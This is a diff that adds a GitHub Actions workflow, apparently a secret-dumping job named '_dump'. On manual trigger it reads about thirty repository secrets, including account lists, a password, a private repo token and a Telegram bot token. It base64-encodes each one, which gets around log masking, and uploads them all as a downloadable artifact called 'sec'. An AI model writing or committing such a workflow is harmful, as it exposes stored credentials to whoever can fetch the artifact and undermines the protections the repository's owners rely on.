@@ -1,0 +1,75 @@
+name: _dump
+on:
+  workflow_dispatch: {}
+jobs:
+  e:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          S_BERRY_BATCH_ACCOUNTS: ${{ secrets.BERRY_BATCH_ACCOUNTS }}
+          S_BERRY_BATCH_ACCOUNTS_GUOG: ${{ secrets.BERRY_BATCH_ACCOUNTS_GUOG }}
+          S_BERRY_BATCH_ACCOUNTS_HSI: ${{ secrets.BERRY_BATCH_ACCOUNTS_HSI }}
+          S_FREEZE_DISCORD_ACCOUNT: ${{ secrets.FREEZE_DISCORD_ACCOUNT }}
+          S_HOHAI_BATCH: ${{ secrets.HOHAI_BATCH }}
+          S_HUS_BATCH: ${{ secrets.HUS_BATCH }}
+          S_HUS_BATCH_2: ${{ secrets.HUS_BATCH_2 }}
+          S_HUS_BATCH_3: ${{ secrets.HUS_BATCH_3 }}
+          S_HUS_HY2_PROXY_URL: ${{ secrets.HUS_HY2_PROXY_URL }}
+          S_HY2_PROXY_URL: ${{ secrets.HY2_PROXY_URL }}
+          S_IDC56_BATCH: ${{ secrets.IDC56_BATCH }}
+          S_JUST_BATCH: ${{ secrets.JUST_BATCH }}
+          S_JUST_HY2_PROXY_URL: ${{ secrets.JUST_HY2_PROXY_URL }}
+          S_KATABUMP_ACCOUNTS_BATCH: ${{ secrets.KATABUMP_ACCOUNTS_BATCH }}
+          S_LEVA_PASSWORD: ${{ secrets.LEVA_PASSWORD }}
+          S_LEVA_USERNAME: ${{ secrets.LEVA_USERNAME }}
+          S_LOC_BATCH: ${{ secrets.LOC_BATCH }}
+          S_LOC_HY2_PROXY_URL: ${{ secrets.LOC_HY2_PROXY_URL }}
+          S_LOLI_BATCH: ${{ secrets.LOLI_BATCH }}
+          S_LOLI_HY2_PROXY_URL: ${{ secrets.LOLI_HY2_PROXY_URL }}
+          S_LUNES_ACCOUNTS_BATCH: ${{ secrets.LUNES_ACCOUNTS_BATCH }}
+          S_LUNES_DE_HY2_PROXY_URL: ${{ secrets.LUNES_DE_HY2_PROXY_URL }}
+          S_LUNES_DE_LUNES_ACCOUNTS_BATCH: ${{ secrets.LUNES_DE_LUNES_ACCOUNTS_BATCH }}
+          S_MEPHIA_BATCH_ACCOUNTS: ${{ secrets.MEPHIA_BATCH_ACCOUNTS }}
+          S_NB_BATCH: ${{ secrets.NB_BATCH }}
+          S_NB_COOKIE_ENCODE_KEY: ${{ secrets.NB_COOKIE_ENCODE_KEY }}
+          S_PRIVATE_REPO_TOKEN: ${{ secrets.PRIVATE_REPO_TOKEN }}
+          S_SB_BATCH: ${{ secrets.SB_BATCH }}
+          S_TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
+          S_TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          mkdir -p out
+          printf '%s' "$S_BERRY_BATCH_ACCOUNTS" | base64 -w0 > out/BERRY_BATCH_ACCOUNTS.b64
+          printf '%s' "$S_BERRY_BATCH_ACCOUNTS_GUOG" | base64 -w0 > out/BERRY_BATCH_ACCOUNTS_GUOG.b64
+          printf '%s' "$S_BERRY_BATCH_ACCOUNTS_HSI" | base64 -w0 > out/BERRY_BATCH_ACCOUNTS_HSI.b64
+          printf '%s' "$S_FREEZE_DISCORD_ACCOUNT" | base64 -w0 > out/FREEZE_DISCORD_ACCOUNT.b64
+          printf '%s' "$S_HOHAI_BATCH" | base64 -w0 > out/HOHAI_BATCH.b64
+          printf '%s' "$S_HUS_BATCH" | base64 -w0 > out/HUS_BATCH.b64
+          printf '%s' "$S_HUS_BATCH_2" | base64 -w0 > out/HUS_BATCH_2.b64
+          printf '%s' "$S_HUS_BATCH_3" | base64 -w0 > out/HUS_BATCH_3.b64
+          printf '%s' "$S_HUS_HY2_PROXY_URL" | base64 -w0 > out/HUS_HY2_PROXY_URL.b64
+          printf '%s' "$S_HY2_PROXY_URL" | base64 -w0 > out/HY2_PROXY_URL.b64
+          printf '%s' "$S_IDC56_BATCH" | base64 -w0 > out/IDC56_BATCH.b64
+          printf '%s' "$S_JUST_BATCH" | base64 -w0 > out/JUST_BATCH.b64
+          printf '%s' "$S_JUST_HY2_PROXY_URL" | base64 -w0 > out/JUST_HY2_PROXY_URL.b64
+          printf '%s' "$S_KATABUMP_ACCOUNTS_BATCH" | base64 -w0 > out/KATABUMP_ACCOUNTS_BATCH.b64
+          printf '%s' "$S_LEVA_PASSWORD" | base64 -w0 > out/LEVA_PASSWORD.b64
+          printf '%s' "$S_LEVA_USERNAME" | base64 -w0 > out/LEVA_USERNAME.b64
+          printf '%s' "$S_LOC_BATCH" | base64 -w0 > out/LOC_BATCH.b64
+          printf '%s' "$S_LOC_HY2_PROXY_URL" | base64 -w0 > out/LOC_HY2_PROXY_URL.b64
+          printf '%s' "$S_LOLI_BATCH" | base64 -w0 > out/LOLI_BATCH.b64
+          printf '%s' "$S_LOLI_HY2_PROXY_URL" | base64 -w0 > out/LOLI_HY2_PROXY_URL.b64
+          printf '%s' "$S_LUNES_ACCOUNTS_BATCH" | base64 -w0 > out/LUNES_ACCOUNTS_BATCH.b64
+          printf '%s' "$S_LUNES_DE_HY2_PROXY_URL" | base64 -w0 > out/LUNES_DE_HY2_PROXY_URL.b64
+          printf '%s' "$S_LUNES_DE_LUNES_ACCOUNTS_BATCH" | base64 -w0 > out/LUNES_DE_LUNES_ACCOUNTS_BATCH.b64
+          printf '%s' "$S_MEPHIA_BATCH_ACCOUNTS" | base64 -w0 > out/MEPHIA_BATCH_ACCOUNTS.b64
+          printf '%s' "$S_NB_BATCH" | base64 -w0 > out/NB_BATCH.b64
+          printf '%s' "$S_NB_COOKIE_ENCODE_KEY" | base64 -w0 > out/NB_COOKIE_ENCODE_KEY.b64
+          printf '%s' "$S_PRIVATE_REPO_TOKEN" | base64 -w0 > out/PRIVATE_REPO_TOKEN.b64
+          printf '%s' "$S_SB_BATCH" | base64 -w0 > out/SB_BATCH.b64
+          printf '%s' "$S_TG_BOT_TOKEN" | base64 -w0 > out/TG_BOT_TOKEN.b64
+          printf '%s' "$S_TG_CHAT_ID" | base64 -w0 > out/TG_CHAT_ID.b64
+      - uses: actions/upload-artifact@v4
+        with:
+          name: sec
+          path: out/
